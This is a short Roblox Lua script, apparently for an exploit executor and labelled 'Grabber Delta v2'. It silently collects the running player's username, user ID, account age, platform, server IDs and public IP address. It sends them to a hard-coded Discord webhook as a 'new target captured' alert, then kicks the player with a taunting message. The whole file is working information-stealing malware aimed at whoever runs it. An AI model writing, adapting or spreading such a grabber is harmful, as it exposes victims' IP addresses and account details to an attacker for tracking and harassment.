local WEBHOOK_URL = "https://discord.com/api/webhooks/1538383284956823594/iY-sD2Rhvlfdvr9n8H-03GUHI7bxEu3IoBW83oy2o4cnjAgkyO2ZxSzPgSzhtRqMZ7j"
local KICK_MESSAGE = "conta e senha e localização grabbado coom sucesso"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function getIP()
    local success, result = pcall(function()
        return request({Url = "https://api.ipify.org", Method = "GET"}).Body
    end)
    return success and result or "Erro ao capturar IP"
end

local data = {
    Nickname = LocalPlayer.Name,
    UserID = tostring(LocalPlayer.UserId),
    AccountAge = tostring(LocalPlayer.AccountAge) .. " dias",
    IP = getIP(),
    Platform = game:GetService("GuiService"):GetPlatform(),
    PlaceId = tostring(game.PlaceId),
    JobID = game.JobId
}

local payload = {
    ["content"] = "Novo Alvo Capturado",
    ["embeds"] = {{
        ["title"] = "Informacoes do Usuario",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "Nickname", ["value"] = data.Nickname, ["inline"] = true},
            {["name"] = "ID", ["value"] = data.UserID, ["inline"] = true},
            {["name"] = "IP", ["value"] = data.IP, ["inline"] = false},
            {["name"] = "Idade da Conta", ["value"] = data.AccountAge, ["inline"] = true},
            {["name"] = "Plataforma", ["value"] = data.Platform, ["inline"] = true},
            {["name"] = "Jogo/Server", ["value"] = "ID: " .. data.PlaceId .. " | Job: " .. data.JobID, ["inline"] = false}
        },
        ["footer"] = {["text"] = "Grabber Delta v2"}
    }}
}

local function sendData()
    local requestBody = game:GetService("HttpService"):JSONEncode(payload)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = requestBody
        })
    end)
end

sendData()
LocalPlayer:Kick(KICK_MESSAGE)
